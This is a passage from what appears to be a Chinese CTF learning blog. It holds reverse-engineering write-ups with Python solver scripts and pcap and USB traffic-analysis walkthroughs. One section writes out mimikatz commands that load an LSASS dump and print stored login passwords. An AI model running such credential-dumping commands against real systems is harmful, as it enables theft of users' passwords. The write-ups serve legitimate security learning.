<h2 id="Buu-xor-ida运用"><a href="#Buu-xor-ida运用" class="headerlink" title="Buu - xor [ ida运用 ]"></a>Buu - xor [ ida运用 ]</h2><p>查壳，无壳，拖进64位ida（我是在linux中file命令看的位）</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-00.png"></p>
<blockquote>
<p>这是main函数，先看到</p>
<p> if ( !strncmp(__b, global, 33uLL) )<br>    printf(“Success”);</p>
<p>要success &#x3D;&gt; __b &#x3D;&#x3D; global 前33位相等</p>
</blockquote>
<blockquote>
<p>全部分析一遍，先给__b 256字节置0 -&gt; 调用get_line函数 -&gt; 输入__b -&gt; __b字符串的长度只能是33 -&gt; 然后是for循环，一个异或</p>
<p>-&gt; 最后比较，前33位要相等</p>
</blockquote>
<p><strong>Result</strong>： global[i] &#x3D; b[i] ^ b[i-1]，我们要求的是__b的值（前面的printf语句，input your flag），可以看出长度为33（如果不是33，直接goto LABEL_7 &#x3D;&gt; return语句）</p>
<p><strong>Skill</strong>：点击global查看它的值，跳转到上面这个图中，看到灰色的部分（我奇怪的是，与Wp中看到的值不一样，我就随便双击了一下灰色部分，发现依然可以跳转），然后就来到了下面这个图的部分</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-01.png"></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shift + e =&gt; 提取数组中的字符</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-02.png" alt="4-5-02"></p>
<p>脚本异或一下得到__b的值</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">data = [</span><br><span class="line">  <span class="number">102</span>,  <span class="number">10</span>, <span class="number">107</span>,  <span class="number">12</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">79</span>,  <span class="number">46</span>,  <span class="number">64</span>,  <span class="number">17</span>,</span><br><span class="line">  <span class="number">120</span>,  <span class="number">13</span>,  <span class="number">90</span>,  <span class="number">59</span>,  <span class="number">85</span>,  <span class="number">17</span>, <span class="number">112</span>,  <span class="number">25</span>,  <span class="number">70</span>,  <span class="number">31</span>,</span><br><span class="line">  <span class="number">118</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">35</span>,  <span class="number">68</span>,  <span class="number">14</span>, <span class="number">103</span>,   <span class="number">6</span>, <span class="number">104</span>,  <span class="number">15</span>,</span><br><span class="line">   <span class="number">71</span>,  <span class="number">50</span>,  <span class="number">79</span>,  <span class="number">0</span></span><br><span class="line">]</span><br><span class="line">x = <span class="string">&quot;f&quot;</span>  <span class="comment"># for循环是从1开始的</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">    x += <span class="built_in">chr</span>(data[i]^data[i-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure></div>

<h2 id="Buu-reverse3-base64加密函数"><a href="#Buu-reverse3-base64加密函数" class="headerlink" title="Buu - reverse3 [ base64加密函数 ]"></a>Buu - reverse3 [ base64加密函数 ]</h2><p>32位无壳，拖进ida32位中，找到main_0函数</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-03.png"></p>
<p>输入字符串 Str -&gt; 经过sub_4110BE函数之后赋值给v4 -&gt; 将v4前40位字符给Destination -&gt; 遍历Destination字符串 每一个加上下表-&gt; 比较Destination 和 Str2是否相同</p>
<blockquote>
<p>sub_4110BE函数</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-04.png"></p>
<p>-&gt; 下面这是一个base64加密的过程（Wp）</p>
<p><strong>Result：</strong>可以查看Str2字符串值（追踪Str2），推出来输入的值（先base64加密 后每一位加上下标）</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-05.png"></p>
<p><strong>payload：</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">str1 = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    str1 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(data[i]) - i)</span><br><span class="line">flag = base64.b64decode(str1)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<h2 id="Buu-不一样的flag-迷宫题"><a href="#Buu-不一样的flag-迷宫题" class="headerlink" title="Buu - 不一样的flag [ 迷宫题 ]"></a>Buu - 不一样的flag [ 迷宫题 ]</h2><p>32位无壳，用ida打开，看到一串数字和上下左右（猜测是迷宫题）</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-00.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-01.png"></p>
<p>选中 <code>&#39;49&#39;</code>换成字符 -&gt; R键将Ascii换成对应字符</p>
<p>-&gt; 如果是1 就退出</p>
<p>-&gt; 如果是# 你输入的序列就是flag</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br><span class="line">下下下右右上上右右下下下</span><br><span class="line">222441144222</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>5*5列，从*开始，1,2,3,4对应上下左右 走到#</p>
</blockquote>
<h2 id="Buu-SimpleRev-字节序-真是逆向了"><a href="#Buu-SimpleRev-字节序-真是逆向了" class="headerlink" title="Buu - SimpleRev [ 字节序 真是逆向了 ]"></a>Buu - SimpleRev [ 字节序 真是逆向了 ]</h2><p>字节的排列方式有两个通用规则： <a class="link" href="https://www.ruanyifeng.com/blog/2022/06/endianness-analysis.html">学习了解字节序00 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>                    <a class="link" href="https://www.ruanyifeng.com/blog/2016/11/byte-order.html">学习了解字节序01 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>大端序</strong> - 数据的低位字节放在内存的高位地址，高位字节存放在低位地址</p>
<p><strong>小端序</strong> - 低位放在低地址，高位放在高地址</p>
<p><strong>CPU读取内存中的数据时，是从低地址向高地址方向进行读取的</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-02.png"></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i ) <span class="comment">// v5是key的长度</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; key[v3 % v5] &lt;= <span class="string">&#x27;Z&#x27;</span> ) <span class="comment">// 判断key中的每个元素是不是大写字母</span></span><br><span class="line">    key[i] = key[v3 % v5] + <span class="number">32</span>;	<span class="comment">// 如果是，将那一位 加上32 =&gt; 变成对应的小写字母</span></span><br><span class="line">  ++v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )	<span class="comment">// 小写字母范围</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> ) <span class="comment">// 大写字母范围</span></span><br><span class="line">    &#123;</span><br><span class="line">      str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>; <span class="comment">// 下面这些就有点懵逼了了</span></span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">  ++v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>还要对Ascii码熟悉点</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-03.png"></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="string">&quot;killshadow&quot;</span></span><br><span class="line">key = <span class="string">&quot;adsfkndcls&quot;</span></span><br><span class="line">dic = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(j) - <span class="number">39</span> - <span class="built_in">ord</span>(key[i]) + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>) == text[i]:</span><br><span class="line">            flag += j</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>case4：将s字符串赋值给f2</p>
<p>case5：对于f2字符串，如果是奇数位 -2；如果是偶数位 -1</p>
<p>case1：f1已知，f2是上面得到的，两个拼接 就是s</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">f1 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x7f</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>] <span class="comment">#逆序 [ 字节序 小端序 ]</span></span><br><span class="line"><span class="comment"># 0x7F666F6067756369</span></span><br><span class="line">flag = f1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>Misc-流量题记录</title>
    <url>/CTF/Misc/%E6%B5%81%E9%87%8F/</url>
    <content><![CDATA[<h2 id="Buu-9-3-1-HTTP流量分析http流量分析"><a href="#Buu-9-3-1-HTTP流量分析http流量分析" class="headerlink" title="Buu - 9.3.1 HTTP流量分析http流量分析"></a>Buu - 9.3.1 HTTP流量分析http流量分析</h2><p>下载<a class="link" href="https://files.buuoj.cn/files/6d44d2b69c7a5941a25b713dde3d903f/atta.pcapng">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，用wireshark打开，题目时http流量的分析</p>
<p>直接过滤搜索http</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-1-00.png"></p>
<p>显而易见的shell.php  &#x3D;&gt; 后门文件吧？</p>
<p>在你觉得可疑的流量包上 右键，追踪流 http流</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-1-01.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-1-02.png"></p>
<h3 id="过滤器知识点："><a href="#过滤器知识点：" class="headerlink" title="过滤器知识点："></a>过滤器知识点：</h3><p><code>http contains &#39;flag&#39;</code></p>
<p>-&gt; 匹配http协议的 且 流量包中含有flag字符的</p>
<hr>
<h2 id="安洵杯-2019-Attack-压缩包"><a href="#安洵杯-2019-Attack-压缩包" class="headerlink" title="[安洵杯 2019]Attack [ 压缩包 ]"></a>[安洵杯 2019]Attack [ 压缩包 ]</h2><p>用wireshark打开，过滤器语句<code> http contains &quot;flag&quot;</code>看看有没有结果：</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-00.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-01.png"></p>
<p>有结果肯定要追踪http流，（我自己做的时候只关注到了flag.txt）却没关注到 PK（zip压缩包的标志）</p>
<p><del>我的第一想法肯定要将它给拿出来进行分离zip获得flag.txt的</del></p>
<p>但看了Wp：直接分离这个流量包（附件）即可：用kali中的工具<code>foremost -T Attack.pcap</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-03.png"></p>
<p>获得zip压缩包，但是有加密，这个压缩包的 属性 -&gt; 注释  中提示信息，指向了管理员的密码</p>
<p>哪里获取管理员密码呢，看Wp说是 dmp文件</p>
<blockquote>
<p>dmp后缀文件是windows系统中的错误转储文件，当windows发生错误蓝屏的时候，系统将当前内存[含虚拟内存]中数据直接写到这类文件中去，方便定位故障原因。 里面包含了主机用户密码信息</p>
</blockquote>
<p>经过过滤器，发现是有dmp的信息的 [ 之后感觉我这个过滤语句不太好，dmp只是三个字符而已，有可能出现偶尔情况，加个. ] [我不知道通配符是什么，我试了 <code>*.dmp</code> 没结果]</p>
<p>发现有，就导出</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-05.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-02.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-04.png"></p>
<p>接下来需要用到工具 <code>mimikatz</code> 下载链接</p>
<p><a class="link" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>具体用法我也不知道。关于这个题：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">//载入dmp文件</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">//读取登陆密码</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-06.png" alt="4-2-06"></p>
<p>我不知道为什么 我输入提升权限的那句代码会报错，</p>
<p>但是输入后面的代码正常运行。</p>
<p>然后就会看到密码了。Password：</p>
<h2 id="NewStarCTF-公开赛赛道-最后的流量分析-tshark"><a href="#NewStarCTF-公开赛赛道-最后的流量分析-tshark" class="headerlink" title="[NewStarCTF 公开赛赛道]最后的流量分析 [ tshark ]"></a>[NewStarCTF 公开赛赛道]最后的流量分析 [ tshark ]</h2><p><a class="link" href="http://linux.51yip.com/search/tshark">tshark的使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>tshark -r sqli.pcap -T fields -Y &quot;http.request.method==GET or frame.len&gt;765&quot; -e &quot;frame.len&quot; -e &quot;http.request.uri.query.parameter&quot; &gt; data.txt</code></p>
<blockquote>
<p>-r 解析的流量文件</p>
<p>-T 指定输出的格式，fields &#x3D;&gt; 只输出符合条件的字段</p>
<p>-Y 用于过滤流量包 &#x3D;&gt; 上面的-Y表示 只取GET方法的或者流量包长度大于765的</p>
<p>-e 要输出的字段 &#x3D;&gt; 上面的-e表示 输出流量包长度以及流量包中uri中的参数</p>
<p>&gt; 重定向，这里表示将输出的东西 重定向到一个data.txt文件内</p>
</blockquote>
<p>第一次用这个tshark 看手册吧.</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">comment = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\CTF\data.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	lines = f.readlines() <span class="comment"># 读取txt文件中的每一行</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lines)):	<span class="comment"># len(lines)-&gt;读取的行数</span></span><br><span class="line">		<span class="comment"># print(lines[i])</span></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">int</span>(lines[i][:<span class="number">3</span>])&gt;<span class="number">765</span>:</span><br><span class="line">			comment += re.findall(<span class="string">r&#x27;&quot;(.)&quot;&#x27;</span>, unquote(lines[i-<span class="number">1</span>]))[<span class="number">0</span>]	<span class="comment"># 观察得到的txt文本，当出现&gt;768的行数，上一行双引号中的内容就是flag的值 =&gt; 正是因为我们观察到了这个，才通过python来得到这个内容</span></span><br><span class="line"><span class="comment"># unquote -&gt; 解码url编码的字符串</span></span><br><span class="line"><span class="comment"># r&#x27;&#x27; -&gt; 将转义字符当做普通字符</span></span><br><span class="line"><span class="comment"># . 通配符</span></span><br><span class="line"><span class="built_in">print</span>(comment)</span><br></pre></td></tr></table></figure></div>

<h2 id="NSS-鹤城杯-2021-流量分析"><a href="#NSS-鹤城杯-2021-流量分析" class="headerlink" title="NSS - [鹤城杯 2021]流量分析"></a>NSS - [鹤城杯 2021]流量分析</h2><p>打开wireshark，看到是sql注入的信息，这题我熟，刚做过。就去用tshark了，但是看了眼wp，直接在这个导出页面找就行！</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-00.png"></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">119</span>,<span class="number">49</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">65</span>,<span class="number">82</span>,<span class="number">75</span>,<span class="number">95</span>,<span class="number">101</span>,<span class="number">122</span>,<span class="number">95</span>,<span class="number">49</span>,<span class="number">115</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">125</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">59</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    result += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag : &quot;</span> + result)</span><br></pre></td></tr></table></figure></div>

<h2 id="USB流量-键盘流量"><a href="#USB流量-键盘流量" class="headerlink" title="USB流量 - 键盘流量"></a>USB流量 - 键盘流量</h2><p><a class="link" href="https://wuyong.lanzout.com/ihBPQ0uug8id">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>            <a class="link" href="https://blog.csdn.net/ON_Zero/article/details/130528679">参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>用tshark获取其中的数据</p>
<p><code>tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p>
<p>-&gt; -r 是要解析的文件名</p>
<p>-&gt; -T 是选择以什么形式输出  &#x3D;&gt; fields 以字段形式输出，意味着只显示捕获数据中的特定字段，而不是整个数据包</p>
<p>-&gt; -e usb.capdata 告诉tshark输出与USB相关的数据，</p>
<p>-&gt; | 这是一个管道符，它将tshark输出传递给 sed命令</p>
<p>-&gt; sed是流编辑器，用于处理文本流，后面这个 &#x2F;^\s*$&#x2F;d 是正则表达式，删除所有空行</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-00.png"></p>
<p>将获取到的数据没两个之间用:隔开</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给每一行的数据 俩俩 用冒号隔开</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\键盘\\usbdata.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\CTF\\Misc流量\\键盘\\out.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># 读取每一行 进行去空，</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        a[i] = a[i].strip()</span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">        <span class="comment"># if a[i]:</span></span><br><span class="line">            <span class="comment"># print(len(a[i]))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a[i]) == <span class="number">16</span>:</span><br><span class="line">            <span class="comment"># print(f&quot;[*] Success &#123;i&#125;&quot;)</span></span><br><span class="line">            out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a[i]), <span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> j+<span class="number">2</span> != <span class="built_in">len</span>(a[i]):</span><br><span class="line">                    out += a[i][j] + a[i][j+<span class="number">1</span>] + <span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out += a[i][j] + a[i][j+<span class="number">1</span>]</span><br><span class="line">            f1.write(out)</span><br><span class="line">            f1.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p>将文中的数据还原成键位</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#最后用脚本提取  键盘数据 -&gt; 字符</span></span><br><span class="line">   <span class="comment"># print((line[6:8])) #输出6到8之间的值</span></span><br><span class="line">   <span class="comment">#取出6到8之间的值</span></span><br><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\键盘\\out.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span 